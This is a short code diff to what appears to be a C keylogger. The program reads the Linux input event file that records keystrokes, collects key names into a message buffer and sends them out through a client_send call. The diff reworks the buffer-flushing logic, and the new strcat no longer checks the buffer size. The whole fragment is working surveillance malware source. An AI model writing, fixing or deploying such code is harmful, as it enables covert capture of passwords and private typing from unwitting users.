@@ -90,7 +90,6 @@ void safebreak(){
 
 void main()
 {
-	int dif;
 	char message[SIZEOF_MESSAGE];
 
 	//open the eventX file that records keystrokes
@@ -119,11 +118,9 @@ void main()
 				}
 				else 
 				{
-					dif = (strlen(message) + strlen(keys[inpEvent.code])) - SIZEOF_MESSAGE;
-					strncat(message, keys[inpEvent.code], dif);
 					client_send(message);
 					strcpy(message, "");
-					strcat(message, keys[inpEvent.code] + dif);
+					strcat(message, keys[inpEvent.code]);
 				}
 			}
 		}
